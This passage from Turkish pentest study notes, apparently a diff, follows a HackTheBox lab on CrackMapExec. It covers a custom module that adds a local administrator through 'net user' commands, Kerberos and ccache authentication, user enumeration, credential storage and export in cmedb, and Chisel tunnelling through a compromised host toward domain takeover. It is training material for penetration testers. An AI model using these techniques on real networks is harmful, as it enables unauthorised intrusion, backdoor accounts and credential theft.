+Ayrıca, modül için değişkenleri tanımlamak için kullanılan options() yöntemine de sahip olacağız. Bu durumda, USER ve PASS olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri HackTheBoxCME! . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.
+
+![Pasted image 20241203150803.png](/img/user/resimler/Pasted%20image%2020241203150803.png)
+![Pasted image 20241203150814.png](/img/user/resimler/Pasted%20image%2020241203150814.png)
+
+26. Daha sonra, on_admin_login() metodunu kullanarak yürütme ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak context.log.info ve context.log.highlight metotlarını kullanacağız (farklı renklere sahipler).
+
+Bu yürütme için, yöntemin connection.execute(command, True) komutunu kullanarak bir cmd.exe komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için net user username password /add /Y değeriyle ve kullanıcıyı administrators grubuna eklemek için net localgroup administrators username /add değeriyle command değişkenine kaydedilecektir.
+
+![Pasted image 20241203150911.png](/img/user/resimler/Pasted%20image%2020241203150911.png)
+![Pasted image 20241203150916.png](/img/user/resimler/Pasted%20image%2020241203150916.png)
+
+Son olarak, yeni modülümüz şu şekilde görünmelidir:
+![Pasted image 20241203150932.png](/img/user/resimler/Pasted%20image%2020241203150932.png)
+![Pasted image 20241203151010.png](/img/user/resimler/Pasted%20image%2020241203151010.png)
+![Pasted image 20241203151027.png](/img/user/resimler/Pasted%20image%2020241203151027.png)
+
+
+### Modülümüzü Çalıştırma
+Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.
+
+
+### CME Modülümüzün Çalıştırılması createadmin
+![Pasted image 20241203151110.png](/img/user/resimler/Pasted%20image%2020241203151110.png)
+
+Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.
+
+![Pasted image 20241203151145.png](/img/user/resimler/Pasted%20image%2020241203151145.png)
+![Pasted image 20241203151149.png](/img/user/resimler/Pasted%20image%2020241203151149.png)
+
+İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.
+
+Ayrıca context.log.highlight(p)'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?
+
+Bir şeyleri yapmanın her zaman farklı yolları olacaktır. Bu modülde neleri değiştireceğinizi ve bunu nasıl daha iyi yapacağınızı keşfedin. Bu modülü daha da özelleştirmek, kendi modüllerinizi oluşturmaya başlamak için harika bir yerdir.
+
+
+### Diğer Yazarlardan Öğrenmek
+Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.
+
+Örneğin, procdump.py modülü procdump.exe çalıştırılabilir dosyasını bir Base64 dizesi olarak kaydeder, ardından Base64 dizesini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için tasklist komutunu çalıştırır, bunu bir değişkene kaydeder ve işlem kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.
+
+Başka bir örnek get_description.py . Bu modülü groupmembership modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve memberOf özniteliğini almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir çekme isteği gönderdik. Çekme isteği kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.
+
+Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.
+
+
+### Çekme İsteği Oluşturma
+CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir çekme isteği ekleyerek projeye katkıda bulunabiliriz.
+
+Bir çekme isteği yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.
+
+İlerleyen bölümlerde, CrackMapExec kullanımı için IPv6, Kerberos Kimlik Doğrulama ve CrackMapExec veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.
+
+
+
+### Ek CME İşlevselliği
+CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:
+
+* Audit (Denetim) modu
+* IPv6 desteği
+* Birden fazla cihaza saldırırken tamamlanma yüzdesi
+
+### Audit Mode
+
+5.3.0 sürümünde yeni bir mod eklendi: audit modu. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz emoji ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.
+
+Audit modunu yapılandırmak için, varsayılan olarak ~/.cme/cme.conf adresinde bulunan yapılandırma dosyasını düzenlememiz ve audit_mode parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için # karakterini kullanacağız
+
+
+### Enabling Audit Mode
+
+![Pasted image 20241203151754.png](/img/user/resimler/Pasted%20image%2020241203151754.png)
+
+Şimdi çalıştırabilir ve parolanın çıktıda ######## ile değiştirildiğini görebiliriz.
+
+![Pasted image 20241203151816.png](/img/user/resimler/Pasted%20image%2020241203151816.png)
+
+Gördüğümüz gibi, çalıştırma sonucundaki parola # karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.
+
+### Denetim Modu Dosyadaki Parola ile Etkinleştirildi
+![Pasted image 20241203151858.png](/img/user/resimler/Pasted%20image%2020241203151858.png)
+
+
+### IPv6 Support
+CrackMapExec'in bir diğer özelliği de IPv6 üzerinden iletişimi desteklemesidir. Çoğu kuruluş, kullanmasalar bile IPv6'yı varsayılan olarak etkinleştirmiştir ve IPv6'nın IPv4'e göre günlük düzeyinde daha az izlenmesi veya anlaşılması bile mümkündür. Bu da ağ saldırılarının gerçekleştirilmesi ve tespit edilmemesi için bir fırsat yaratmaktadır.
+
+Popüler modüller bölümünde gördüğümüz gibi CrackMapExec get_netconnections modülü ile bilgisayarların IPv6'sını tespit etmemizi sağlıyor. Bu modülü kullanalım ve ardından komutu IPv6 üzerinden çalıştırmayı deneyelim.
+
+
+### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma
+
+![Pasted image 20241203152004.png](/img/user/resimler/Pasted%20image%2020241203152004.png)
+![Pasted image 20241203152012.png](/img/user/resimler/Pasted%20image%2020241203152012.png)
+
+Şimdi IPv6 üzerinden hedefe erişelim.
+![Pasted image 20241203152032.png](/img/user/resimler/Pasted%20image%2020241203152032.png)
+![Pasted image 20241203152041.png](/img/user/resimler/Pasted%20image%2020241203152041.png)
+![Pasted image 20241203152051.png](/img/user/resimler/Pasted%20image%2020241203152051.png)
+
+
+
+### Tamamlanma Yüzdesi
+
+Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik --shares seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.
+
+
+### Tamamlanma Yüzdesi
+![Pasted image 20241203152158.png](/img/user/resimler/Pasted%20image%2020241203152158.png)
+
+Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.
+
+
+### Kerberos Authentication
+
+Yazma sırasında CrackMapEec, SMB, LDAP ve MSSQL protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:
+
+27. ccache dosyasını belirtmek için KRB5CCNAME env adını kullanma. Password Attacks academy modülündeki Pass the Ticket (PtT) from Linux bölümünde Linux'tan Kerberos kullanımı anlatılmaktadır
+28. CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir biletle KRB5CCNAME ortam değişkenini kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.
+
+Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin FQDN'sini çözümlemesi gerektiğidir. Dahili bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve /etc/hosts dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.
+
+
+### Setting Up the /etc/hosts File
+
+![Pasted image 20241203152738.png](/img/user/resimler/Pasted%20image%2020241203152738.png)
+
+![Pasted image 20241203152745.png](/img/user/resimler/Pasted%20image%2020241203152745.png)
+
+CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.
+
+
+### Username and Password - Kerberos Authentication
+CrackMapExec'i -k veya --kerberos seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.
+
+### Kerberos Authentication
+![Pasted image 20241203152841.png](/img/user/resimler/Pasted%20image%2020241203152841.png)
+![Pasted image 20241203152849.png](/img/user/resimler/Pasted%20image%2020241203152849.png)
+
+
+
+### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
+
+Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi Kerbrute'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos ön kimlik doğrulaması (ASREPRoasting) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: account_not_exist , julio , ve robert .
+
+
+### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
+![Pasted image 20241203152959.png](/img/user/resimler/Pasted%20image%2020241203152959.png)
+
+Gördüğümüz gibi, Kerbrute CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC ön kimlik doğrulaması isterse, KDC_ERR_PREAUTH_FAILED hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, asreproast saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce AESREPRoast Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.
+
+Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos günlüğü etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.
+
+
+### Using AES-128 or AES-256
+Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'lerini de kullanabiliriz, Impacket'ten Secretsdump gibi araçlar genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullanırsak, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve operasyonel bir avantajı (opsec) temsil edecektir. Secretsdump'ı kullanalım ve ardından kimlik doğrulaması için AES256'yı kullanalım.
+
+
+### AES256 ile Kimlik Doğrulama
+
+![Pasted image 20241203153254.png](/img/user/resimler/Pasted%20image%2020241203153254.png)
+
+![Pasted image 20241203153303.png](/img/user/resimler/Pasted%20image%2020241203153303.png)
+
+
+### CCache file - Kerberos Authentication
+
+Bir kimlik bilgisi önbelleği (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle hizmetlere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.
+
+Çoğu durumda, Linux makineleri Kerberos biletlerini ccache dosyaları olarak depolar, sistemlerin biletleri kullanma şekli, ccache dosyasının yolunu gösteren KRB5CCNAME ortam değişkeni aracılığıyla olur. robert kullanıcısı için bir bilet (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım
+
+Bileti oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME ortam değişkenini getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.
+
+
+### Ticket Granting Tickets
+
+![Pasted image 20241203153521.png](/img/user/resimler/Pasted%20image%2020241203153521.png)
+
+![Pasted image 20241203153540.png](/img/user/resimler/Pasted%20image%2020241203153540.png)
+
+Kerberos kimlik doğrulama yöntemimiz olarak KRB5CCNAME ortam değişkenini kullanmak için --use-kcache seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.
+
+
+### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)
+
+![Pasted image 20241203153620.png](/img/user/resimler/Pasted%20image%2020241203153620.png)
+
+
+### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)
+
+![Pasted image 20241203153647.png](/img/user/resimler/Pasted%20image%2020241203153647.png)
+Kerberos Kimlik Doğrulamasını MSSQL protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.
+
+
+### MSSQL Protokolü ile ccache Dosyasını Kullanma
+
+![Pasted image 20241203153720.png](/img/user/resimler/Pasted%20image%2020241203153720.png)
+
+Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz
+
+
+### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme
+
+![Pasted image 20241203153749.png](/img/user/resimler/Pasted%20image%2020241203153749.png)
+![Pasted image 20241203153756.png](/img/user/resimler/Pasted%20image%2020241203153756.png)
+
+
+CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı cmedb ile etkileşime gireceğiz
+
+
+### CMEDB'de Uzmanlaşmak
+
+CME otomatik olarak tüm kullanılan/dökülen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan SQLite veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları ~/.cme/workspaces içinde saklanır. Varsayılan veritabanları ~/.cme/workspaces/default dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.
+
+
+### Varsayılan Veritabanlarını Listeleme
+
+![Pasted image 20241203153927.png](/img/user/resimler/Pasted%20image%2020241203153927.png)
+
+### Veritabanı ile Etkileşim
+
+CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan cmedb ile birlikte gelir. cmedb komutunu yazmak bizi bir komut kabuğuna götürecektir:
+
+### CMEDB
+![Pasted image 20241203154012.png](/img/user/resimler/Pasted%20image%2020241203154012.png)
+
+
+### Workspaces
+Varsayılan çalışma alanı adı varsayılan olarak adlandırılır (bilgi isteminde gösterildiği gibi). Bir çalışma alanı seçildiğinde, CME'de yaptığımız her şey bu çalışma alanında saklanacaktır. Bir çalışma alanı oluşturmak için, cmedb (varsayılan) > komut isteminin root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.
+
+
+### Creating a Workspace
+
+![Pasted image 20241203154232.png](/img/user/resimler/Pasted%20image%2020241203154232.png)
+
+Çalışma alanlarını listelemek için workspace list , çalışma alanını değiştirmek için ise workspace "workspace" yazabiliriz.
+
+
+### Çalışma Alanlarını Listeleme ve Değiştirme
+
+
+![Pasted image 20241203154332.png](/img/user/resimler/Pasted%20image%2020241203154332.png)
+![Pasted image 20241203154335.png](/img/user/resimler/Pasted%20image%2020241203154335.png)
+
+
+### Bir Protokolün Veritabanına Erişim
+
+cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca SMB ve MSSQL yararlı seçeneklere sahiptir:
+
+![Pasted image 20241203154400.png](/img/user/resimler/Pasted%20image%2020241203154400.png)
+
+Bir protokolün veritabanına erişmek için proto protocol komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için help seçeneğini kullanabiliriz:
+
+
+### SMB Protokol Veritabanına Bağlanma
+![Pasted image 20241203154437.png](/img/user/resimler/Pasted%20image%2020241203154437.png)
+
+
+### Protocol Options
+SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.
+
+### Kimlik Bilgilerini Görüntüleme
+CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, düz metin veya hash olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki creds seçeneğini kullanmamız gerekir.
+
+
+### Displaying SMB Credentials
+
+![Pasted image 20241203154559.png](/img/user/resimler/Pasted%20image%2020241203154559.png)
+
+![Pasted image 20241203154618.png](/img/user/resimler/Pasted%20image%2020241203154618.png)
+
+Gördüğünüz gibi, creds'ten sonra bir kullanıcı adı ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca creds hash seçeneği ile tüm hash'leri veya creds plaintext seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.
+
+
+### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme
+
+![Pasted image 20241203154648.png](/img/user/resimler/Pasted%20image%2020241203154648.png)
+
+![Pasted image 20241203154654.png](/img/user/resimler/Pasted%20image%2020241203154654.png)
+
+Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir
+
+MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir
+
+
+### MSSQL için Kimlik Bilgilerini Görüntüleme
+![Pasted image 20241203154752.png](/img/user/resimler/Pasted%20image%2020241203154752.png)
+
+Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.
+
+
+### Kimlik Bilgilerini Kullanma
+
+CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. Julio'nun kimlik bilgilerini id 4 ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için -id CredID seçeneğini kullanmamız gerekir.
+
+### CrackMapExec ile Etkileşim için CredID Kullanımı
+
+![Pasted image 20241203154910.png](/img/user/resimler/Pasted%20image%2020241203154910.png)
+
+
+### Hosts Information
+
+MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.
+
+
+### Displaying Hosts
+![Pasted image 20241203155109.png](/img/user/resimler/Pasted%20image%2020241203155109.png)
+
+![Pasted image 20241203155117.png](/img/user/resimler/Pasted%20image%2020241203155117.png)
+
+
+### Share Information
+
+CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için cmedb içerisinde SMB protokolü içerisinde shares seçeneğini kullanmamız gerekiyor.
+
+### Paylaşımları Geri Alma
+
+![Pasted image 20241203155153.png](/img/user/resimler/Pasted%20image%2020241203155153.png)
+
+
+### Kullanıcı Ekleme ve Kaldırma
+CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve creds add veya creds remove kullanıyoruz.
+
+
+### cmedb'ye Kullanıcı Ekleme
+
+![Pasted image 20241203155239.png](/img/user/resimler/Pasted%20image%2020241203155239.png)
+Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.
+
+
+### Bir Kullanıcıyı cmedb'den Kaldırma
+
+![Pasted image 20241203155300.png](/img/user/resimler/Pasted%20image%2020241203155300.png)
+
+![Pasted image 20241203155318.png](/img/user/resimler/Pasted%20image%2020241203155318.png)
+
+
+### Empire Kimlik Bilgilerini İçe Aktarma
+cmedb'nin sahip olduğu bir başka özellik de Empire'dan kimlik bilgilerini içe aktarma yeteneğidir.
+
+
+### Import from Empire
+
+![Pasted image 20241203155352.png](/img/user/resimler/Pasted%20image%2020241203155352.png)
+
+Not: Bu özelliği kullanmak istiyorsanız Empire'ı yapılandırdığınızdan emin olun
+
+### Export cmedb Data
+
+CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları dışarı aktarabiliriz
+
+
+### Kimlik Bilgilerini cmedb'den Dışa Aktarma
+
+![Pasted image 20241203155453.png](/img/user/resimler/Pasted%20image%2020241203155453.png)
+
+![Pasted image 20241203155458.png](/img/user/resimler/Pasted%20image%2020241203155458.png)
+
+Veriler CSV dosyası olarak dışa aktarılır. LibreOffice veya Excel gibi araçları kullanarak açabiliriz.
+
+![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)
+
+
+
+### skill 
+
+CrackMapExec aracı hakkında derinlemesine bir eğitim kursu aldıktan sonra ilk Dahili Sızma Testinizi gerçekleştiren bir Sızma Test Uzmanısınız. Müşteriniz INLANEFREIGHT CORP, Active Directory ortamını değerlendirmek için firmanızı işe aldı. İlk göreviniz geçerli bir hesap bulmak ve farklı protokoller kullanarak ortak bir parola denemek. Müşteriniz herhangi bir kesinti süresini göze alamaz, bu nedenle herhangi bir hesabı kilitlememeye dikkat etmeniz gerekir. Geçerli bir hesap bulduğunuzda, diğer hesapları ele geçirmenize yardımcı olacak ilginç bilgileri bulmak için numaralandırın, numaralandırın, numaralandırın. Unutmayın, amacınız alan yöneticisi erişimi elde edene kadar mümkün olduğunca çok hesabı ele geçirmektir. Amacınız hedef etki alanını ele geçirmek ve NTDS dosyasının içeriğini elde etmektir. Bu modülü dikkatle takip ettiyseniz, uzun sürmeyecektir.
+
+
+### Hedef ortama bağlanma adımları
+
+Uzaktan dahili bir sızma testi yapıyorsunuz, bu nedenle önce VPN'e bağlanmanız ve oradan 172.16.15.0/24 hedef ağına dahili numaralandırma yapmanız gerekecek. Dahili şirket ağına bağlanmak için aşağıdaki gibi Chisel ve proxyychains kullanmanız gerekecektir:
+
+
+### Connecting to the Internal Network VPN
+
+![Pasted image 20241203155738.png](/img/user/resimler/Pasted%20image%2020241203155738.png)
+![Pasted image 20241203155743.png](/img/user/resimler/Pasted%20image%2020241203155743.png)
+
+Chisel ile kullanmayı seçtiğiniz bağlantı noktasıyla eşleşmesi için /etc/proxychains.conf dosyasını değiştirmeyi unutmayın.
+
+Hedef sistemi başlattığınızda, 10.129.204.182 örnek IP'sini hedef IP'nizle değiştirin.
+
+Dahili ağı numaralandırmak için şu komutu kullanabilirsiniz: 
+proxychains crackmapexec [protocol] [target] CME ile Proxychains bölümünde gösterildiği gibi., 'print
+
+{{CODE_BLOCK_96}}
+
+Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir
+
+`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:
+
+
+### Spider_plus Options
+
+{{CODE_BLOCK_97}}
+
+Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.
+
+
+---
+
+
+### Proxychains with CME
+
+### Scenario
+
+İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:
+
+![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)
+
+DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.
+
+
+### Set Up the Tunnel
+
+Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:
+
+*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:
+
+### Chisel - Reverse Tunnel
+
+{{CODE_BLOCK_98}}
+
+
+*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:
+
+
+### Upload Chisel
+
+{{CODE_BLOCK_99}}
+
+
+* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)
+
+
+### Connect to the Chisel Server
+
+{{CODE_BLOCK_100}}
+
+Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.
+
+**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.
+
+### Chisel Receiving Session No. 1
+
+{{CODE_BLOCK_101}}
+
+TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:
+
+
+### Check Listening Port
+
+{{CODE_BLOCK_102}}
+
+* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:
+
+
+### Configure Proxychains
+
+{{CODE_BLOCK_103}}
+
+* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:
+
+### CrackMapExec'in Proxychains ile Test Edilmesi
+
+{{CODE_BLOCK_104}}
+
+
+Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:
+
+### Quiet Seçeneği ile Proxychains4
+
+{{CODE_BLOCK_105}}
+
+Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.
+
+
+### Killing Chisel on the Target Machine
+
+İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.
+
+
+### Kill the Chisel Client
+
+{{CODE_BLOCK_106}}
+
+Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:
+
+
+### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması
+
+{{CODE_BLOCK_107}}
+
+Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.
+
+
+### Attack Host Üzerinde Chisel'i Kapatma
+
+{{CODE_BLOCK_108}}
+
+
+### Sunucu olarak Windows ve Client olarak Linux
+
+Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.
+
+
+### Chisel'i Hedef Makinede Sunucu Olarak Başlatma
+
+{{CODE_BLOCK_109}}
+
+Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.
+
+
+### Attack Hostumuzdan Chisel Sunucusuna Bağlanma
+
+{{CODE_BLOCK_110}}
+
+Şimdi Proxychains'i tekrar kullanabiliriz:
+
+### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma
+
+{{CODE_BLOCK_111}}
+
+Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.
+
